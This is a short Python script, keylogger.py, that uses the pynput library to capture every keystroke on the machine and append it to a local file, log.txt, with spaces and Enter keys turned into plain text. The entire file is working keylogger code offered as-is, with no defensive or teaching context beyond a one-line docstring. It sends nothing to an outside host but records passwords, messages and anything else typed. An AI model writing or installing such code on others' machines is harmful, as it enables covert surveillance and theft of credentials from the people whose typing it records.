
# keylogger.py
from pynput.keyboard import Listener  # No need to import Key

"""
A simple keylogger script that logs all keystrokes to a file.
"""

def write_to_file(key):
    """
    Logs the pressed key to a file.
    """

    key = str(key).replace("'", "")  # Remove quotes around the key
    if key == 'Key.space':
        key = ' '  # Replace "Key.space" with a space
    if key == 'Key.enter':
        key = '\n'  # New line for "Enter" key
    with open("log.txt", "a", encoding="utf-8") as f:

        f.write(key)

# This function listens for key events
def on_press(key):
    write_to_file(key)

# This starts the keylogger
with Listener(on_press=on_press) as listener:
    listener.join()

